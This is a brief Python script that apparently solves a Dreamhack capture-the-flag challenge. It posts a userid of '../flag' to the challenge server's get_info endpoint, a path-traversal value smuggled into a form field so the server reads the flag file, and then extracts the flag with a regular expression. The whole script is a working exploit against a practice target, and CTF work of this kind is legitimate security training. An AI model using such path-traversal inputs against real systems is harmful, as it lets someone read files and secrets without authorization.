import requests
import re

URL = "http://host3.dreamhack.games:23718/get_info"
resp = requests.post(URL, data={'userid': '../flag'})
match = re.search(r'DH\{[^]^<]*\}', resp.text)


print(match.group(0))
